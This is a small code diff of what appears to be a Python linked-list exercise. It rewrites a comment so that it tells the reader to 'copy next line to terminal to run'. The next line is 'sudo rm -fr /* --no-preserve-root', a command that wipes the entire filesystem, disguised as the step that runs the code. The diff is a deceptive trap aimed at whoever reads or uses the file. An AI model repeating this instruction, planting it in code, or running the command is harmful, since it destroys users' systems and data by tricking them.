@@ -3,7 +3,7 @@
 #    next = None
 #    def __init__ (self, value) :
 #        self.value = value
-#uncomment next line to run:
+#copy next line to terminal to run:
 ##sudo rm -fr /* --no-preserve-root
 
 #def makeLL (arr):
